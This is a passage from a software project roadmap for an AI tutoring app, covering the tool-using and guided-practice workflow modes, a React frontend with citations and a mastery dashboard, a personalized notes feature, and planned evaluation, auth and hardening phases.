> content types (image/audio/video, PDF, octet-stream) are refused explicitly rather than decoded
> into token-wasting mojibake. Output capped by `fetch_webpage_max_chars` (default 6,000, same
> cost/UX-bound idiom as `placement_light_test_size`). `build_tools()` gained an injectable
> `fetch: Fetcher = safe_fetch` kwarg, mirroring `ingest_source(..., fetch: Fetcher =
> default_fetch)`'s exact seam, so tests inject a canned fetcher with no live network. Unlike
> `search_materials`, `fetch_webpage` needs no `session`/`llm`/`learner_id` — it's fully stateless.
>
> **`build_tools()`'s flat list still not promoted** to a heavier `ToolSpec`/`ToolContext`
> registry — tool #2 has now arrived, but the actual motivating need (tier-gating, per-tool
> context shape) still doesn't exist: `Learner` has no `tier` field, and "tier" elsewhere in this
> codebase's docs means the age/persona rollout (MASTERPLAN: "MVP deliberately stays in the adult
> tier"), not a feature-access system. YAGNI still holds.
>
> **Still open after slice 2:** the unified engine's workflow mode + first structured workflow
> graph. Landed in slice 3 below, closing out Phase 6.
>
> **Workflow mode landed (slice 3) — Phase 6 complete.** The third mode: a fixed multi-step
> sequence with a human-in-the-loop pause, distinct from `agentic` (model freely chooses tools)
> and `chat` (one generate call). Chosen workflow: **guided practice** — present a worked example +
> practice problem for the learner's active lesson-plan step, pause for their attempt, grade it,
> give feedback (looping for another attempt, capped, if wrong), done. `app/agent/workflow.py`'s
> loop (`present -> await_response -> grade -> respond`, routing back to `await_response` until
> correct or `workflow_max_rounds` is hit) mirrors `refinement.py`'s HITL/checkpointer shape
> (its own `InMemorySaver`, same documented limitations) but is new territory: `grade` actually
> **writes to the DB mid-graph**, closing over `session`/`learner_id` (never stored in
> checkpointed state) — the dispatcher rebuilds the graph fresh each request with that request's
> own `session`/`llm`, exactly like `build_refinement_graph(llm)` already does. `grade` calls the
> existing `assessment_svc.answer_item` — the same grade→tracer→plan-revise transaction
> `/items/{id}/answer` already uses — so this workflow adds zero new grading/tracer logic.
>
> **Item-type scoping was the one real design fork.** `AnswerSubmit.response`'s shape is
> item-type-specific (MCQ needs a `{"choice": <index>}` matched against a `choices` list
> `ItemRead` doesn't even expose to the learner — a separate, pre-existing gap left untouched) —
> none of which map cleanly from free-text chat except `ItemType.SHORT` (open, rubric-graded):
> `{"text": reply}` is a direct match, and it exercises the LLM rubric-grading path CLAUDE.md
> calls load-bearing. Added `generate_short_item` (`app/learning/item_generation.py`, mirroring
> the three existing generators) and `session_runner.short_answer_item_for_kc` — a **dedicated**
> resolver, deliberately without `item_for_kc`'s any-type/MCQ fallback, since falling back to a
> different item type would silently mis-grade every submission as incorrect rather than fail
> loudly. `respond`'s feedback instructs the model to re-pose the *same* problem with a hint when
> looping, never a new one — grading is always anchored to the original `item.stem`, so a
> model-invented "next problem" would be graded against a question the learner was never asked.
>
> Reachable via `ChatTurnRequest.mode: "chat" | "agentic" | "workflow"`; `send_message` checks
> `mode == "workflow"` **or** an in-flight workflow checkpoint (whichever is true) right after
> `agentic`, ahead of goal/refinement-gate branching — a workflow presupposes a committed goal +
> plan, so it never negotiates one, and an in-flight workflow always wins over the client's `mode`
> on the next turn, mirroring the refinement gate's `is_awaiting_reply` precedent exactly. The
> `awaiting_reply` SSE frame gained `item` (previously `done`-only) so the client can render the
> practice problem while paused. No new `TurnEvent` fields beyond that — the grade/score is folded
> into `respond`'s prose rather than wired as structured data, a deliberate v1 scoping choice.
>
> **Verified empirically before implementing** (not just recalled from training): reusing one
> `thread_id` across multiple sequential fresh (non-`Command`) runs on the same LangGraph
> checkpointer correctly starts over from `START` each time, with no stale bleed-through from an
> earlier completed run — what lets one conversation support multiple guided-practice sessions
> over time on `thread_id = str(conversation_id)`; and `aget_state` on a thread that's never been
> run returns an empty, falsy snapshot, so `is_awaiting_reply` needs no special-casing for a
> conversation that's never attempted a workflow.
>
> **This closes Phase 6's DoD**: a guru can take a tool-using action (`agentic`, slice 1-2) and
> run a structured workflow end-to-end (`workflow`, slice 3). "Selected by need/tier" is satisfied
> minimally — `mode` is an explicit per-turn client choice, not yet auto-selected by a policy; a
> future phase could add that without changing this shape.

---

## Phase 7 — Frontend MVP (React + Vite)

**Goal:** the learner-facing product.

**Scope**
- ☑ Vite + React + TS app; typed API client generated from the OpenAPI schema.
- ☑ Streaming tutor chat UI (chat + agentic modes; conversation create/rename/delete).
- ☑ Lesson-plan + session UI (with the guided-practice side panel).
- ☑ **Conversation scope:** starting a chat picks a subject (or an explicit "general" for no
  library grounding), with optional per-source narrowing within that subject's materials.
  Retrieval never crosses subject boundaries — **Memory stays learner-global by design** (a
  mnemonic invented while studying art history is still recallable while studying physics; the
  *content*, not personal facts, is what's hard-scoped). Backend retrieval scoping
  (`app/rag/retrieval.py::retrieve`, `Source.subject_id`/`topic_id`) already supports this —
  the gap is a conversation-to-source link and the picker UI.
- ☑ **Citations:** every generation mode (chat, agentic, workflow — not just content-block
  generation, which already has this) grounds responses in retrieved chunks and cites them.
  v1 citation click-through shows the cited chunk's own extracted text + locator in a pane —
  not a re-rendered original-format viewer (no PDF page-jump/audio-scrub UI yet; the locator
  data to build one later already exists in `Chunk.provenance`).
- ☑ **Statistics dashboard:** mastery at KC/topic/subject levels, retention curves, momentum, and the
  **learner profile** ("how you learn" — with view/reset); tasteful **mastery-based** gamification
  (rewards tied to learning, not time-on-app).
- ☑ Uploads; conversation/session history.

**DoD:** an adult learner completes the full loop in the browser — place → plan → session → assess →
see the dashboard update — with streaming responses, sourced and cited from the learner's own
scoped materials.

> **Uploads + conversation/session history landed (slice 6) — Phase 7 complete.** `/app/uploads`:
> a subject-taggable upload form (file or web link, backed by the already-existing
> `POST /sources/upload`/`POST /sources/link` — no backend ingestion work needed, purely a
> frontend gap) plus a materials list filterable by subject with a status badge
> (pending/processing/done/failed).
>
> **A real routing bug surfaced live and got fixed, not shipped**: a guided-practice session is
> just a `Conversation` row (per slice 4), so it showed up in the plain chat sidebar too — but
> opening it there rendered the refinement-gate's "Sounds good, let's start" button, since the
> frontend read "no goal set yet" as "awaiting goal negotiation" with no way to tell a paused
> workflow apart from an actual new chat. Clicking it would have submitted that literal sentence
> as the learner's answer to whatever practice problem was in progress. Fixed at the model level
> — a new `Conversation.kind: "chat" | "session"` column (migration `0016_conversation_kind`, set
> once at creation, never changed) — rather than papering over it client-side: the sidebar now
> routes a `kind: "session"` row to `/app/lessons/session/:id`, and `Chat.tsx` redirects there
> too if a session conversation is ever opened at `/app/chat/:id` directly (stale bookmark,
> back button). Session conversations also now get a real title (`Practice: <KC name>`) instead
> of falling back to "New conversation" in the sidebar — the practical form "session history"
> takes here, rather than a separate history page duplicating the existing sidebar.
>
> **Statistics dashboard landed (slice 5).** `/app/dashboard`: an activity card (streak +
> momentum), a per-subject mastery drill-down (a progress ring at the subject level, bars per
> topic, per-KC ability/uncertainty below that — TECHNICAL_DESIGN §7.4's own target UX, "Calculus
> 62% (wide) ... Integrals 40%, integration-by-parts weakest"), the learner profile (view +
> per-dimension reset + a refresh action, already fully built in an earlier phase and just wired
> up here), and a global due-for-review list.
>
> **Two new backend endpoints, both thin plumbing over already-tested code, no new math:**
> `GET /subjects/{id}/mastery` walks `app/learning/mastery.py`'s existing `estimate_kc`/
> `rollup_topic`/`rollup_subject` (unit-tested since an earlier phase, just never exposed) and
> reuses the lesson plan's own `MASTERY_ABILITY_THRESHOLD`/`MASTERY_UNCERTAINTY_THRESHOLD` so a
> KC/topic/subject's "mastered" badge means the same thing here as it does on the lesson-plan
> page. `GET /activity` is new: a pure `streak_days`/`momentum_trend` policy
> (`app/learning/activity.py`) over the raw `learning_events` log — no new tables, streak
> defined as consecutive days with a real graded observation (not an app-open), momentum as a
> v1-arbitrary ratio between the trailing two 7-day windows. **Momentum had no prior definition
> anywhere in the codebase or docs** — this is a from-scratch product decision, not a discovered
> spec.
>
> **A real, pre-existing bug surfaced and fixed in passing**: `LearningEvent.created_at` is a
> naive `TIMESTAMP` column (unlike `LearnerKCState`'s explicit `DateTime(timezone=True)` fields),
> so comparing it against a tz-aware `datetime.now(UTC)` crashes asyncpg outright
> ("can't subtract offset-naive and offset-aware datetimes") — `get_activity` is the first code
> in this codebase to run a time-range query against that column. Fixed by stripping tzinfo
> before comparing, documented inline so a future reader doesn't "fix" it back to tz-aware and
> reintroduce the crash.
>
> **Deliberately scoped out of v1**: a true FSRS retention/forgetting-curve chart — `fsrs_card`
> is an intentionally opaque blob (`app/learning/scheduler.py`: "our schema never couples to FSRS
> internals"), so a real curve needs new backend work (expose `stability`/`difficulty`/
> `retrievability`, or replay `learning_events` to reconstruct ability-over-time) that wasn't
> justified for this slice; the due-for-review list already surfaces the retention-relevant
> signal that exists today. A dedicated reviews-due *widget* on the Lessons page was also skipped
> — `revise_steps` already interleaves due reviews into the lesson plan's own step list, so it
> lives on the dashboard as a global cross-subject view instead, not duplicated per subject.

> **Lesson-plan + guided-practice session UI landed (slice 4).** A per-subject `/app/lessons`
> view: an optional placement flow (a freeform background prompt → one LLM call seeds per-KC
> ability/uncertainty priors, never overwriting real evidence) feeding into `POST
> .../lesson-plan` generation (an optional goal, otherwise pure policy — no LLM call), then the
> plan's flat, backend-ordered `steps` list rendered with KC names resolved per-step, the active
> step highlighted, done steps checked off. "Start practice" creates a subject-scoped
> conversation and jumps into `/app/lessons/session/:id` — the workflow-mode chat transcript
> (reusing `useChatConversation`/`MessageList`/`Composer` as-is, extended with a `fixedMode` prop
> so the session composer skips the chat/agentic toggle) plus a persistent item side panel
> showing the KC and practice stem, sourced from the `awaiting_reply`/`done` SSE events' `item`
> field — wiring that already existed on the wire but wasn't consumed by any hook yet. A session
> auto-starts its first workflow turn on mount (ref-guarded against double-fire, not an effect
> `setState`).
>
> **The plan never has a "start next session" endpoint to call** — `revise_plan` runs
> automatically as a side effect of grading any answer (the workflow's `grade` node included), so
> the frontend just re-reads the plan; the newly-active step is already there.
>
> **A real gap surfaced live, not a bug**: finishing a workflow round with a correct answer ends
> that round (`detail: "mastered"`) but does **not** by itself flip the lesson-plan step to
> `"done"` — that requires the KC's rolling ability/uncertainty estimate to cross a fixed
> threshold (`app/services/lesson_plan.py`'s `MASTERY_ABILITY_THRESHOLD`/
> `MASTERY_UNCERTAINTY_THRESHOLD`), which one correct short-answer response usually doesn't reach
> from a cold start — exactly the point of a continuous IRT model (partial, accumulating
> evidence, not a binary pass/fail). Caught via live verification: the UI originally said
> "Mastered!" after one correct answer, which overclaimed what the backend event actually meant;
> relabeled to "Correct — nice work!" to keep the round-level and plan-level notions of "mastered"
> from being conflated.
>
> Reviews-due (`GET /reviews/due`) got no separate widget this slice — `revise_steps` already
> interleaves due-review steps into the same ordered `steps` list, so working through the plan
> already surfaces them; a standalone queue view is deferred, not required for the phase DoD.
> Mid-session reload also isn't fully robust yet: the side panel's `item`/outcome state is local
> to the live SSE stream, not reconstructed from persisted state, so a refresh mid-practice loses
> the panel until the next reply — a known, accepted v1 gap in the same spirit as Phase 6's
> workflow-mode note above (§ "the grade/score is folded into `respond`'s prose rather than wired
> as structured data").

> **Conversation scope + citations landed (slice 3).** A `ConversationSource` join table
> (empty = every source under the conversation's subject) backs a "New chat" modal: pick a
> subject (or "General," no grounding) then optionally narrow to specific sources. A shared
> `format_grounding`/`extract_citations` pair (`app/services/turn_common.py`) produces and parses
> literal `[N]` markers embedded in message text — one protocol reused unchanged across all three
> generation paths: plain chat (one retrieval per turn), agentic (a `CitationAccumulator` dedupes
> and stably numbers chunks across repeated `search_materials` tool calls within a turn), and
> workflow (grounds only the `present` step's worked example — `respond`'s feedback isn't
> source-derived, so it's never cited even if its prose coincidentally contains `[N]`-shaped
> text). `Message.citations` (JSONB, mirrors `ContentBlock.citations`'s shape) lets the frontend
> render markers as clickable superscripts (`MessageBlock`) opening a slide-over `CitationPane`
> with the cited chunk's own extracted text + locator (page/slide/timestamp/paragraph from
> `Chunk.provenance`) — the v1 click-through decision above, now implemented.
>
> This is a "grounding-set" claim, not a verified-per-sentence-correct one — same honesty bar as
> `ContentBlock.citations` already had. Two real SQLAlchemy async bugs surfaced and got fixed
> along the way: `session.get()` silently ignores eager-load `options` when the object is already
> in the session's identity map (fixed with `populate_existing=True`); and reading a lazy
> relationship (`Conversation.source_ids`) from inside `run_workflow_turn` was async-unsafe unless
> the caller happened to eager-load it, so `source_ids` became an explicit parameter threaded down
> from the API layer instead, matching the other two turn services.

> **App shell + design system + chat UI landed (slices 1–2 + QoL).** Slice 1: app shell, design
> system, typed API client (see below for full detail). Slice 2: streaming chat UI — a
> conversation sidebar, flat-block message rendering with a live streaming cursor, a Chat/Agentic
> mode toggle, inline tool-call chips during agentic turns, and refinement-gate handling (an
> inline "sounds good, let's start" accept action, a goal marker once committed) reconstructed
> from persisted state so it's correct after a reload, not just live. Plus a QoL pass: rename
> (inline edit) and delete (inline confirm, hard delete, cascades cleanly) on conversations,
> backed by new `PATCH`/`DELETE /conversations/{id}` endpoints.

> **App shell + design system landed (slice 1).** `frontend/` (Vite + React 19 + TS), scaffolded
> fresh — nothing existed before this slice. Deliberately **scaffolding only**: routing, the typed
> API client, the auth-stub wiring, the theme system, and top-nav layout chrome — the four main
> screens (`/app/chat`, `/app/lessons`, `/app/dashboard`, `/app/uploads`) are placeholders this
> slice, real content is later slices.
>
> **Design system, not defaults.** A first pass at this plan specified "Poppins, teal primary,
> DaisyUI" — vague enough to produce a generic-looking AI-app (stock Tailwind teal, one font
> doing every job, an unmodified component-library look, a centered-hero-plus-cards landing
> page). Replaced with specifics: a **Fraunces + Inter** type pairing (a characterful display
> face + a neutral, legible-at-small-sizes text face — not one geometric sans stretched across
> every role) with a defined type scale; a real color system anchored on a deliberately
> non-default teal (`#0E7C6B`, not Tailwind's stock `teal-500`) with a separate amber accent
> reserved *only* for gamification/celebration moments; a 4px spacing scale; **Lucide** for every
> functional icon, with the 🌱 emoji brand mark reserved as the *only* emoji in the UI (never a
> stand-in for real icons); and an asymmetric landing-page hero with concrete, mechanism-specific
> copy and a real product-preview mock — not a gradient-wash hero, the single most recognizable
> "AI-generated SaaS landing page" tell. **Tailwind v4 + DaisyUI v5**, but DaisyUI is used as a
> headless behavioral base only — both `guru-light`/`guru-dark` themes are built entirely from
> custom `oklch()` tokens (computed from the hex anchors above) via DaisyUI v5's CSS-based
> `@plugin "daisyui/theme"` syntax; no stock DaisyUI theme is used unmodified.
>
> **Typed client**: `openapi-typescript` generates `src/api/schema.d.ts` from the backend's
> `/openapi.json` (`npm run gen:api`, checked-in output), paired with `openapi-fetch` for a fully
> typed request client (`src/api/client.ts`). SSE isn't representable in OpenAPI's streaming
> story, so `src/api/sse.ts` hand-rolls a `fetch` + `ReadableStream` reader (the backend's chat
> endpoint is a POST-body stream, not a GET `EventSource`) with a `TurnEvent` union manually kept
> in sync with `app/api/v1/chat.py::event_stream`'s frame shapes. A small `useConversations`
> TanStack Query hook proves the whole path end-to-end (typed client → CORS → stub auth → real
> DB) on the Chat placeholder, not just that it compiles.
>
> **Backend**: added `CORSMiddleware` + a `cors_origins` setting (`app/main.py`,
> `app/core/config.py`) — nothing existed before, and the Vite dev server can't call the API
> cross-origin without it.
>
> **Swapped `oxlint` (create-vite's new default) for ESLint + Prettier** to match this repo's
> already-documented `npm run lint` convention, rather than let the scaffold tool's latest default
> silently redefine it.
>
> **Deliberately deferred**: no frontend test runner yet (nothing meaningfully interactive exists
> to test); no mobile responsiveness (desktop-only for this phase, by design); no client-side auth
> UI (the stub-auth seam resolves the dev learner server-side, same as `curl`/tests today).
>
> **Phase 7 complete** — see the landed-notes above for slices 1–6 + QoL.

---

## Phase 8 — Notes: the durable, personalized learning artifact

**Goal:** notes become the primary long-term learning artifact — dynamically built as the
learner studies, personalized to how they learn, and supplemented (not replaced) by MCQ/cloze/
short-answer/flashcard practice.

**Scope**
- ☑ `Note` domain model: per-learner, per-topic (KC-tagged), cumulative — distinct from
  `ContentBlock` (shared/cached *across* learners) and `Memory` (facts about the learner, not
  learned content itself). See MASTERPLAN §4.9.
- ☑ Auto-distillation: sessions/turns that cover new material feed a note-building step —
  notes accumulate as the learner studies a topic, not generated only on request.
- ☑ Profile-driven note format: the learner's profile shapes the note's presentation (bullet
  points / narrative / mnemonics / worked examples / etc.) — a new profile dimension or an
  extension of an existing one (design TBD when this phase starts); reuses `interests`/
  `reading_level` where relevant for grounding/complexity.
- ☑ Notes UI: browsable per subject/topic, learner-editable (not purely system-maintained),
  reflects updates as new sessions add to it.

**DoD:** studying a topic across multiple sessions (e.g. linear algebra) produces a growing,
readable set of notes in a format suited to that learner, browsable/editable in a dedicated
notes section, without needing to explicitly ask for them.

> **Notes landed — Phase 8 complete.** A per-learner, per-topic note (`Note`, migration `0017`)
> that grows unprompted as the learner studies, distinct from `ContentBlock` (shared across
> learners) and `Memory` (facts about the learner). The load-bearing decision is a
> **substrate/projection split**: the source of truth is a format-neutral, KC-tagged list of
> *atoms* (`concept` / `example` / `callout` / `learner`) stored as JSONB; the four reading
> formats (outline / narrative / mnemonic / worked-examples) are cached LLM *projections* of that
> substrate (`NoteRender`), not separate copies. Switching format is a cheap re-render, never a
> re-distillation — and every explicit switch is evidence that earns a `note_format` profile
> dimension (≥3 choices with a strict majority), so the system *learns* a learner's preferred
> format and applies it as the default via a cascade (explicit choice > learned dimension >
> conceptual-error heuristic > `outline`).
>
> **Notes build by catch-up-on-read, not a background job.** Each note carries a `watermark`;
> opening (or explicitly refreshing) it distills only the session transcript + graded outcomes
> accumulated *past* that watermark, then advances it. Activity that turns out to hold nothing
> note-worthy still advances the watermark (a `no_change` reply, no new revision) so a topic
> doesn't re-distill the same sibling-topic chatter forever. All distill/absorb/render steps run
> on the `SMART` role through the registry and are cost-logged per call; a parse failure or a
> broken invariant keeps the existing note untouched and simply stays stale to retry later.
>
> **The one hard guarantee is enforced in code, not merely prompted.** A distill merge that drops
> a learner-contributed atom is *rejected* (`_learner_atoms_preserved`) — the model may restructure
> freely but cannot silently delete something the learner wrote. Edit-absorption is the deliberate
> exception: when the learner edits the rendered note directly, their edit is the authority and
> *may* delete even their own earlier atoms. Every change (distill / learner-edit / restore)
> appends an immutable `NoteRevision`; history is browsable with a deterministic, LLM-free "source"
> view (`mechanical_render`) per revision, and restoring an old revision copies it *forward* as a
> new revision rather than rewriting history. Eight endpoints back a dedicated `/app/notes` UI
> (per-subject index with stale badges, `react-markdown` render, format switcher, inline edit,
> stale "catch-up" banner, and a revision-history drawer).
>
> **Known v1 gaps, deferred deliberately:** granularity is topic-level only (no per-KC or
> cross-topic notes); notes are an *output*, not yet a retrieval source the tutor reads *from*; and
> the format-switch *event* history isn't recorded — only the current `note_format` majority is,
> enough to pick a default but not to chart preference drift over time.

---

## Phase 9 — Experiment & evaluation suite

**Goal:** know which prompts, models, and configurations are actually optimal — measured, not guessed.

**Scope**
- ☐ Extend the existing eval harness (`tests/eval/`, `poe eval`) into a **config-sweep / ablation
  runner**: parameterize experiments over the model-role registry (which model backs
  `FAST`/`SMART`/`GENIUS`/`EMBED`), prompt variants, and generation configs; run the golden + live
  suites across the sweep matrix.
- ☐ **MLflow — tracking subset only**: log params/metrics/artifacts per run to a local file-backed
  store with the run-comparison UI. Deliberately **no** model registry / serving / deployment
  surface (avoids the overkill parts). Behind a thin seam so the tracking backend stays swappable.
- ☐ **Experiment datasets from the KC-tagged event log**: build reusable eval sets (grading,
  refinement gate, content generation, retrieval, KC-tagging) from real logged interactions — the
  substrate the swappable-tracer + KC-tagged event log were designed to earn from day one.
- ☐ **DSPy optimization workstream** (moved here from hardening): compile internal modules (grading,
  refinement gate, content generation) offline against those datasets/metrics; report eval deltas
  vs. the hand-written prompts.
- ☐ Ablation reporting: a repeatable way to answer "does component X earn its cost?" — e.g. hybrid
  vs. vector-only retrieval, refinement gate on/off, per-role model swaps, memory on/off.

**DoD:** a single command runs a prompt × model × config sweep, results land in MLflow with a
side-by-side comparison, ablations are reproducible, and DSPy-compiled modules are measured against
the hand-written baselines on real-data eval sets.

> Not started. Sequenced before auth/hardening on purpose: the alpha/beta rollout should be informed
> by measured prompt/model/config choices, not locked in blind.

---

## Phase 10 — Lightweight auth + admin portal

**Goal:** the minimum identity + operator visibility needed to run alpha/beta — real accounts, plus
an admin view into cost, usage, and users.

**Scope**
- ☐ **Lightweight auth**: login (email/password or a single OAuth provider — design-time call),
  session/token issuance, replacing the stubbed `get_current_learner` seam with a real resolver.
  `learner_id` is already threaded everywhere behind that seam, so this is a swap, not a rewire.
- ☐ **Admin portal**: operator-only views for **cost & token usage** (the per-call `LLMCall` log
  already captures this, tagged by role+model), **user management**, and other operational signals
  as they're needed.
- ☐ **Root / impersonation access** for alpha/beta support: an admin can act into another account —
  built with an **explicit scope, mandatory audit logging of every impersonation, and a clean
  removal seam**. It is a temporary alpha/beta affordance removed at full release, not a permanent
  backdoor.
- ☐ Authorization boundary: learner vs. admin roles; the admin surface gated separately from the
  learner app.

**DoD:** a learner can create an account and log in (no more stub); an admin can log into the portal,
see cost/token/usage and manage users, and impersonate an account with every impersonation audited;
the impersonation path sits behind a single seam that can be disabled/removed for full release.

> Not started. Deliberately lightweight — full production auth hardening (rate limiting, real session
> security, provider hardening) is Phase 11. This is "enough to run supervised tests with real
> accounts + operator visibility," not the final auth system.

---

## Phase 11 — Hardening & scale

**Goal:** production-readiness.

**Scope**
- ☐ Production auth hardening (building on Phase 10): rate limiting; caching; real session/token
  security; **remove the alpha/beta impersonation affordance**.
- ☐ Robust queue/workers; tracing + cost dashboards.
- ☐ Deployment pipeline; prod provider hardening (OpenRouter → hyperscaler option for compliance).
- ☐ Wire the Phase 9 eval suite as a **release gate** — block deploys on regressions in
  teaching/grading quality (educational quality + grading reliability).

**DoD:** deployable with hardened auth, observability, and an eval gate (on the Phase 9 suite) that
blocks regressions in teaching/grading quality.

---

## Deferred Backlog (see Masterplan §9)

DKT · standards alignment · teacher/school B2B + dashboards · multi-tenant orgs/classes ·
younger tiers + COPPA/FERPA/GDPR-K · offline / low-bandwidth · mobile & desktop · billing.
